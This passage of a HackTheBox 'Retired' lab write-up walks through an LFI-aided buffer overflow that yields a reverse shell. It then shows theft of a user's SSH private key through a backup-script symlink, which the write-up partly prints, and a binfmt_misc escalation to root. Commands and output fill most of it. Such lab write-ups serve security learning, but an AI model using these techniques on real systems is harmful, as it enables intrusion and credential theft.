    0x7ffff7ca5000    0x7ffff7cca000 r--p    25000 0      /lib/x86_64-linux-gnu/libc-2.31.so
....
    0x7ffff7e6a000     0x7ffff7e7a000 r--p    10000 0      /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
....
pwndbg&gt; 
</pre></table></code></div></div><p>If we now execute activate_license, and run the <a href="https://github.com/Jayden-Lind/HTB-Retired/blob/master/pwntool-local.py">pwntool-local.py</a> in another terminal, then open a netcat listener shell, we will get a reverse shell back, which was executed by the activate_license binary.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$nc</span> <span class="nt">-nvlp</span> 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 50862
<span class="nb">pwd</span> 
/home/jayden/ctf/retired
</pre></table></code></div></div><p>Switch back to gdb</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>pwndbg: loaded 198 commands. Type pwndbg <span class="o">[</span>filter] <span class="k">for </span>a list.
pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
Reading symbols from activate_license…
pwndbg&gt; <span class="nb">set </span>args 1337
pwndbg&gt; run
Starting program: /home/jayden/ctf/retired/activate_license 1337
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
<span class="o">[</span>+] starting server listening on port 1337
<span class="o">[</span>+] listening …
<span class="o">[</span>+] accepted client connection from 0.0.0.0:0
<span class="o">[</span>Attaching after Thread 0x7ffff7b380c0 <span class="o">(</span>LWP 7853<span class="o">)</span> fork to child process 7938]
<span class="o">[</span>New inferior 2 <span class="o">(</span>process 7938<span class="o">)]</span>
<span class="o">[</span>Detaching after fork from parent process 7853]
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 7853<span class="o">)</span> detached]
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
<span class="o">[</span>+] reading 1000 bytes
<span class="o">[</span>+] activated license: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�����
process 7938 is executing new program: /bin/dash
</pre></table></code></div></div><p>Now time for exploiting this on the remote machine. Since we have LFI, we can check the /proc/<em>pid</em>/maps to see the vmmap of the remote process, which will allow us to get the base addresses of loaded libraries, and also download those versions of the libraries (as they may be different to our local machine) and discover some ROP gadgets to chain to get our code exectution.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$wget</span> http://10.10.11.154/index.php?page<span class="o">=</span>php://filter/resource<span class="o">=</span>/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 <span class="nt">-O</span> libsqlite3.so.0.8.6
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$ROPgadget</span> <span class="nt">--binary</span> libsqlite3.so.0.8.6 | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"jmp rsp"</span>
0x00000000000d431d : jmp rsp
</pre></table></code></div></div><p>The end result ends up being this script I wrote <a href="https://github.com/Jayden-Lind/HTB-Retired/blob/master/pwntool-remote.py">pwntool-remote.py</a>.</p><p>Update our reverse shell binary, point to our VPN IP, and set up a listener on port 4444, and let’s see what we get back.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$nc</span> <span class="nt">-nvlp</span> 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.154 52972
Upgrade to full reverse shell: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
www-data@retired:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 1512
drwxrwsrwx  3 www-data www-data   4096 Jun 19 10:24 <span class="nb">.</span>
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
<span class="nt">-rw-r--r--</span>  1 dev      www-data 505153 Jun 19 10:22 2022-06-19_10-22-01-html.zip
<span class="nt">-rw-r--r--</span>  1 dev      www-data 505153 Jun 19 10:23 2022-06-19_10-23-01-html.zip
<span class="nt">-rw-r--r--</span>  1 dev      www-data 505153 Jun 19 10:24 2022-06-19_10-24-01-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
<span class="nt">-rw-r--r--</span>  1 www-data www-data  12288 Jun 19 10:21 license.sqlite
www-data@retired:/var/www<span class="nv">$ </span>
</pre></table></code></div></div><h2 id="success"><span class="mr-2">Success!</span><a href="#success" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We got a shell on the remote box, now let’s try to enumerate more.</p><p>First thing we see is these zip files being created locally every minute. Let’s run <a href="https://github.com/carlospolop/PEASS-ng">linpeas</a> and see if we can find anything useful.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>www-data@retired:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 1512
drwxrwsrwx  3 www-data www-data   4096 Jun 22 10:29 <span class="nb">.</span>
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
<span class="nt">-rw-r--r--</span>  1 dev      www-data 505153 Jun 22 10:27 2022-06-22_10-27-01-html.zip
<span class="nt">-rw-r--r--</span>  1 dev      www-data 505153 Jun 22 10:28 2022-06-22_10-28-08-html.zip
<span class="nt">-rw-r--r--</span>  1 dev      www-data 505153 Jun 22 10:29 2022-06-22_10-29-02-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
<span class="nt">-rw-r--r--</span>  1 www-data www-data  12288 Jun 22 10:29 license.sqlite
www-data@retired:/var/www<span class="nv">$ </span>wget http://10.10.14.30/linpeas.sh
<span class="nt">--2022-06-22</span> 10:34:54--  http://10.10.14.30/linpeas.sh
Connecting to 10.10.14.30:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776776 <span class="o">(</span>759K<span class="o">)</span> <span class="o">[</span>text/x-sh]
Saving to: ‘linpeas.sh’
linpeas.sh          100%[<span class="o">===================&gt;]</span> 758.57K  2.49MB/s    <span class="k">in </span>0.3s    
2022-06-22 10:34:54 <span class="o">(</span>2.49 MB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>776776/776776]
www-data@retired:/var/www<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh 
www-data@retired:/var/www<span class="nv">$ </span>./linpeas.sh 
╔══════════╣ Backup files <span class="o">(</span>limited 100<span class="o">)</span>
<span class="nt">-rwxr-xr-x</span> 1 root root 485 Oct 13  2021 /usr/bin/webbackup
</pre></table></code></div></div><p>We find an interesting file, looks like a the shell script that is outputting those files into /var/www/. And since these zip files are owned by user “dev” we can assume it’s running under the “dev” user. So let’s try and see if dev has a private SSH key.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>www-data@retired:/var/www<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/webbackup 
<span class="c">#!/bin/bash</span>
<span class="nb">set</span> <span class="nt">-euf</span> <span class="nt">-o</span> pipefail
<span class="nb">cd</span> /var/www/
<span class="nv">SRC</span><span class="o">=</span>/var/www/html
<span class="nv">DST</span><span class="o">=</span><span class="s2">"/var/www/</span><span class="si">$(</span><span class="nb">date</span> +%Y-%m-%d_%H-%M-%S<span class="si">)</span><span class="s2">-html.zip"</span>
/usr/bin/rm <span class="nt">--force</span> <span class="nt">--</span> <span class="s2">"</span><span class="nv">$DST</span><span class="s2">"</span>
/usr/bin/zip <span class="nt">--recurse-paths</span> <span class="s2">"</span><span class="nv">$DST</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$SRC</span><span class="s2">"</span>
<span class="nv">KEEP</span><span class="o">=</span>10
/usr/bin/find /var/www/ <span class="nt">-maxdepth</span> 1 <span class="nt">-name</span> <span class="s1">'*.zip'</span> <span class="nt">-print0</span> <span class="se">\</span>
    | <span class="nb">sort</span> <span class="nt">--zero-terminated</span> <span class="nt">--numeric-sort</span> <span class="nt">--reverse</span> <span class="se">\</span>
    | <span class="k">while </span><span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">''</span> backup<span class="p">;</span> <span class="k">do
        if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$KEEP</span><span class="s2">"</span> <span class="nt">-le</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
            /usr/bin/rm <span class="nt">--force</span> <span class="nt">--</span> <span class="s2">"</span><span class="nv">$backup</span><span class="s2">"</span>
        <span class="k">fi
        </span><span class="nv">KEEP</span><span class="o">=</span><span class="s2">"</span><span class="k">$((</span>KEEP-1<span class="k">))</span><span class="s2">"</span>
    <span class="k">done
</span>www-data@retired:/var/www/html<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/dev/.ssh/id_rsa <span class="nb">.</span>
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$wget</span> http://10.10.11.154/index.php?page<span class="o">=</span>php://filter/resource<span class="o">=</span>/var/www/2022-06-19_12-28-01-html.zip <span class="nt">-O</span> html.zip
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$unzip</span> html.zip
Archive:  html.zip
  inflating: var/www/html/id_rsa
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$cat</span> var/www/html/id_rsa
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA58qqrW05/urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yf
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$ssh</span> <span class="nt">-i</span> id_rsa dev@10.10.11.154
Linux retired 5.10.0-11-amd64 <span class="c">#1 SMP Debian 5.10.92-2 (2022-02-28) x86_64</span>
The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23
dev@retired:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
554c6e854251a377cdc59e4b4d6f2cde
dev@retired:~<span class="err">$</span>
</pre></table></code></div></div><h2 id="user-owned"><span class="mr-2">User Owned!</span><a href="#user-owned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now let’s have a look at root. Let’s run linpeas again as the dev user and see if we can find anything.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>dev@retired:/var/www<span class="nv">$ </span>/var/www/linpeas.sh 
╔══════════╣ Readable files belonging to root and readable by me but not world readable
<span class="nt">-rwxr-x---</span> 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
<span class="nt">-rw-r-----</span> 1 root dev 33 Jun 22 04:27 /home/dev/user.txt
dev@retired:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/lib/emuemu/reg_helper 
<span class="nt">-rwxr-x---</span> 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
</pre></table></code></div></div><p>This reg_helper binary is interesting, let’s browse around in the “dev” users home directory. Looks like reg_helper is binary that was written/compiled on this box and we can see the source code.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>dev@retired:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/dev/emuemu/
total 68
drwx------ 3 dev dev  4096 Mar 11 14:36 <span class="nb">.</span>
drwx------ 6 dev dev  4096 Mar 11 14:36 ..
<span class="nt">-rw-------</span> 1 dev dev   673 Oct 13  2021 Makefile
<span class="nt">-rw-------</span> 1 dev dev   228 Oct 13  2021 README.md
<span class="nt">-rw-------</span> 1 dev dev 16608 Oct 13  2021 emuemu
<span class="nt">-rw-------</span> 1 dev dev   168 Oct 13  2021 emuemu.c
<span class="nt">-rw-------</span> 1 dev dev 16864 Oct 13  2021 reg_helper
<span class="nt">-rw-------</span> 1 dev dev   502 Oct 13  2021 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11 14:36 <span class="nb">test
</span>dev@retired:~/emuemu<span class="nv">$ </span><span class="nb">cat </span>reg_helper.c 
<span class="c">#define _GNU_SOURCE</span>
<span class="c">#include &lt;fcntl.h&gt;</span>
<span class="c">#include &lt;stdio.h&gt;</span>
<span class="c">#include &lt;string.h&gt;</span>
<span class="c">#include &lt;sys/stat.h&gt;</span>
<span class="c">#include &lt;sys/types.h&gt;</span>
<span class="c">#include &lt;unistd.h&gt;</span>
int main<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
    char cmd[512] <span class="o">=</span> <span class="o">{</span> 0 <span class="o">}</span><span class="p">;</span>
    <span class="nb">read</span><span class="o">(</span>STDIN_FILENO, cmd, sizeof<span class="o">(</span>cmd<span class="o">))</span><span class="p">;</span> cmd[-1] <span class="o">=</span> 0<span class="p">;</span>
    int fd <span class="o">=</span> open<span class="o">(</span><span class="s2">"/proc/sys/fs/binfmt_misc/register"</span>, O_WRONLY<span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="nt">-1</span> <span class="o">==</span> fd<span class="o">)</span>
        perror<span class="o">(</span><span class="s2">"open"</span><span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>write<span class="o">(</span>fd, cmd, strnlen<span class="o">(</span>cmd,sizeof<span class="o">(</span>cmd<span class="o">)))</span> <span class="o">==</span> <span class="nt">-1</span><span class="o">)</span>
        perror<span class="o">(</span><span class="s2">"write"</span><span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>close<span class="o">(</span>fd<span class="o">)</span> <span class="o">==</span> <span class="nt">-1</span><span class="o">)</span>
        perror<span class="o">(</span><span class="s2">"close"</span><span class="o">)</span><span class="p">;</span>
    <span class="k">return </span>0<span class="p">;</span>
<span class="o">}</span>
dev@retired:~/emuemu<span class="nv">$ </span>
</pre></table></code></div></div><p>We can see what looks like this <a href="https://github.com/toffan/binfmt_misc">binfmt_misc</a>, which will allow us to priv esc to root. Running this payload directly on the box fails, as we don’t have direct write access to “/proc/sys/fs/binfmt_misc/register”, but we do through “reg_helper”, which can be seen below, as the error it’s failing on is the write command.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>dev@retired:~<span class="nv">$ </span>/usr/lib/emuemu/reg_helper 
fdafdsafdsaf
write: Invalid argument
dev@retired:~<span class="nv">$ </span>
</pre></table></code></div></div><p>All we need to do, is pass the binfmt line to the reg_helper STDIN and we will get a root shell!</p><p>Using <a href="https://github.com/Jayden-Lind/HTB-Retired/blob/master/exploit.sh">exploit.sh</a> we can get a root shell.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>dev@retired:~<span class="nv">$ </span>vi exploit.sh
dev@retired:~<span class="nv">$ </span><span class="nb">chmod</span> +x ./exploit.sh 
dev@retired:~<span class="nv">$ </span>./exploit.sh 
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># whoami</span>
root
<span class="c"># cat root.txt</span>
<span class="nb">cat</span>: root.txt: No such file or directory
<span class="c"># cat /root/root.txt</span>
c8a25a84ec484df4652a44291fa86c1a
<span class="c"># </span>
</pre></table></code></div></div><h2 id="root-owned"><span class="mr-2">Root owned!</span><a href="#root-owned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Retired%20-%20Jayden%20Lind%20-%20Portfolio&url=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-retired%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Retired%20-%20Jayden%20Lind%20-%20Portfolio&u=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-retired%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-retired%2F&text=HackTheBox%20-%20Retired%20-%20Jayden%20Lind%20-%20Portfolio" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/taz/">Breaking 20 year old PC game copy protection</a><li><a href="/posts/htb-retired/">HackTheBox - Retired</a><li><a href="/posts/linds-zabbix/">Monitoring homelab with Zabbix</a><li><a href="/posts/linds-terraform/">Implementing Terraform with vSphere</a><li><a href="/posts/linds-kubernetes/">Moving to Kubernetes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/terraform/">terraform</a> <a class="post-tag" href="/tags/zabbix/">zabbix</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-noter/"><div class="card-body"> <em class="small" data-ts="1652968800" data-df="ll" > May 20, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Noter Walkthrough</h3><div class="text-muted small"><p> Noter was an interesting box, user was easy to get, required enumerating extensively. Scanning Start off with a nmap $ nmap -sV -p- -oA 10.10.11.160 10.10.11.160 Nmap scan report for 10.10.11.16...</p></div></div></a></div><div class="card"> <a href="/posts/htb-opensource/"><div class="card-body"> <em class="small" data-ts="1654005600" data-df="ll" > Jun 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenSource</h3><div class="text-muted small"><p> HTB - OpenSource walkthrough OpenSource was a harder than initially thought box, I got lost in some rabbit holes, such as escaping the docker container, the Werkzueg console etc. Even though this ...</p></div></div></a></div><div class="card"> <a href="/posts/taz/"><div class="card-body"> <em class="small" data-ts="1679230800" data-df="ll" > Mar 20, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breaking 20 year old PC game copy protection</h3><div class="text-muted small"><p> Introduction As a kid, I used to play Taz: Wanted on my PC, but nowadays it’s impossible to play these old games as most modern PCs don’t have a CD drive. While you can easily download no-CD crack...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-opensource/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - OpenSource</p></a> <a href="/posts/linds-kubernetes/" class="btn btn-outline-primary" prompt="Newer"><p>Moving to Kubernetes</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/terraform/">terraform</a> <a class="post-tag" href="/tags/zabbix/">zabbix</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/jayden-lind">jayden-lind</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-BZK4D02L4Z"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-BZK4D02L4Z', {'cookie_expires': 0 }); }); </script>
